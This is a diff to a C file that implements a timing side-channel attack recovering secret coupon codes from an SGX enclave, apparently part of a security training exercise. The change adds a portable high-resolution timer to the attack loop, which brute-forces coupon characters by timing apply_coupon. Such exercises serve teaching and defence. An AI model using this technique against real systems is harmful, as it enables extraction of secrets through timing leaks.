@@ -2,6 +2,27 @@
 #include "stdafx.h"
 #include "exploits.h"
 #include "common_enclave_actions.h"
+
+#ifndef _MSC_VER
+#include <time.h>
+
+uint64_t get_high_resolution_time(void)
+{
+	timespec thetime;
+	clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &thetime);
+	return (thetime.tv_sec * 1000000000) + thetime.tv_nsec;
+}
+
+
+#else
+uint64_t get_high_resolution_time(void)
+{
+	return __rdtsc();	
+}
+
+#endif
+
+
 // this attack will not work on windows because the SGX SDK is 
 // heavily optimized and compares the data by 8 bytes whenever possible
 // Unfortunately I couldnt find a way to misuse alignment
@@ -23,9 +44,9 @@ void e1_timing_attack(char* server_ip, int iport, char* library_folder)
 		return;
 	}
 	// 
-	char *alphabet = "CDEFGHIJKLMNOPQRSTUVWXYZ0123456789_AB";
+	const char *alphabet = "CDEFGHIJKLMNOPQRSTUVWXYZ0123456789_AB";
 	// we already know that the coupons starting from DVSE_CPN from the previous excercise
-	char coupon[33] = "DVSE_CPN_\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
+    char coupon[33] = "DVSE_CPN_\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
 	bool res = false;
 	int syms_in_alphabet = (int)strlen(alphabet);
 	int num_combinations = syms_in_alphabet * syms_in_alphabet;
@@ -43,9 +64,9 @@ void e1_timing_attack(char* server_ip, int iport, char* library_folder)
 			for (j = 0; j < try_count; j++)
 			{
 				uint64_t start, end;
-				start = __rdtsc();
+				start = get_high_resolution_time();
 				res = apply_coupon(coupon);
-				end = __rdtsc();
+				end = get_high_resolution_time();
 				if (res)
 				{
 					printf("\nRecovered coupon: %s", coupon);
